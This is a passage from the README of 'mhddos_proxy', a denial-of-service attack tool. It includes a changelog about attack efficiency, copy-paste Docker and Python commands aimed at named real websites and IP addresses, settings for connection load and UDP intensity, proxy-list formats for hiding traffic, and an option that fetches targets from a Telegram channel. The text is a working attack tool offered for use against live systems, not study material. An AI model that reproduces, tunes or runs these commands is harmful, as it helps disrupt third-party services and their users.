  <summary>üìú Earlier Releases</summary>

- **23.04.2022** 
  - The `--vpn` option has been changed - now your IP/VPN is being used **together** with the proxy, rather than instead. To restore the previous behavior, use `--vpn 100`
- **20.04.2022**
  - Significantly improved the system resources utilization for the best attack efficiency
  - Added `--udp-threads` option in order to control the intensity of UDP attacks (default 1)
- **18.04.2022** 
  - In the `--debug` mode, total statistics for all targets have been added
  - More proxy servers have been added
- **13.04.2022** 
  - Added the option to disable targets and add comments to the configuration file; now lines starting with '#' are ignored
  - Fixed an issue of crashing the script after a long run and other bugs while changing loops
  - Fixed color display on Windows terminal (without editing the registry)
  - In case of no targets available, the script will wait, instead of stopping completely

### üíΩ Installation - [instructions are here](/docs/installation.md)

### üïπ Running (different options for targets are given)

#### Docker (for Linux, add sudo in front of the command)

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

#### Python (If it doesn't work, try `python` or `python3.10` instead of `python3`)

    python3 runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

### üõ† Settings (check out more in the [CLI](#cli) section)

**All options can be combined**, you can specify them either before and after the list of targets

Change the workload: `-t XXXX`; the maximum number of simultaneously open connections; if the machine has one CPU, the default is 1000, if more than one, then is 7500.

***For Linux, add `sudo` in front of the `docker` command***

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru

To monitor information about the attack progress, add the `--table` flag for the table-style display, `--debug` for the text

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru
    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru

To attack targets provided by https://t.me/itarmyofukraine2022 add the `--itarmy` option  

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table --itarmy

### Custom proxies

#### File format:

    IP:PORT
    IP:PORT:username:password
    username:password@IP:PORT
    protocol://IP:PORT
    protocol://IP:PORT:username:password
    protocol://username:password@IP:PORT

where `protocol` can be one of 3 options: `http`|`socks4`|`socks5`. 
If `protocol` is not specified, default value `http` is being set.
For example, for a public proxy: `protocol=socks4 IP=114.231.123.38 PORT=3065` the format will be fhe following:
```shell
socks4://114.231.123.38:3065
```
and for private one: `protocol=socks4 IP=114.231.123.38 PORT=3065 username=isdfuser password=ashd1spass`
format can be one of the following:
```shell
socks4://114.231.123.38:3065:isdfuser:ashd1spass
socks4://isdfuser:ashd1spass@IP:PORT
```

**URL of the remote file for Python and Docker**

    python3 runner.py https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
where https://pastebin.com/raw/UkFWzLOt is your web page with a list of proxies (each proxy should be on a new line)  

**Path for the local file for Python**  
  
Put the file in the folder with `runner.py` and add the following option to the command (replace `proxies.txt` with the name of your file)

    python3 runner.py --proxies proxies.txt https://ria.ru

where `proxies.txt` is your proxy list file (each proxy should be on a new line)

### Localization

As of now, the application supports 2 languages: English and Ukrainian. 
Default language is set by command line is Ukrainian, but it is likely to be changed as soon as we expand our community 
on other countries.

There are two ways to set the language:

### 1. By command line
    python3 runner.py --lang EN https://ria.ru
    python3 runner.py --lang UA https://ria.ru

Most likely, this is the way most Python users prefer to change it. 

### 2. By environment variable
    export MHDDOS_LANG=EN
    python3 runner.py https://ria.ru

An environment variable is easy to pass into the Docker container with the `-e` option

    docker run -e MHDDOS_LANG=UA -it --rm --log-driver none --name multidd --pull always karboduck/multidd
